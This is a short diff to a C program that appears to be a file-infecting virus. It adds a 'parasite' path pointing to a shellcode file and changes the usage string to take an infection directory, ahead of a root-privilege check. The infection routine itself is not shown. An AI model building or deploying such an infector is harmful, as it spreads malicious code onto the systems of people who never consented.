@@ -32,17 +32,24 @@ Description : This program parses all the directories and subdirectories under t
 
 
 
+char *parasite_path;
+
+
 int main(int argc, char *argv[])
 {
 
 	// Check for command line arguments
 	if (argc < 2)
 	{
-		fprintf(stderr, RED"[-]"YELLOW" Usage"RESET":"BLUE" %s <PATH>\n", argv[0]);
+		fprintf(stderr, RED"[-]"YELLOW" Usage"RESET":"BLUE" %s <INFECTION_DIR> <PATH_TO_PARASITE>\n", argv[0]);
 		exit(0x10);
 	}	
 
-
+	
+	// setting parasite_path to argv[2]
+	//parasite_path = argv[2];
+	parasite_path = "./shellcode/parasite_code";
+	
 
 	// Get the real and effective user IDs and check if user has root priveleges
 	uid_t uid = getuid();
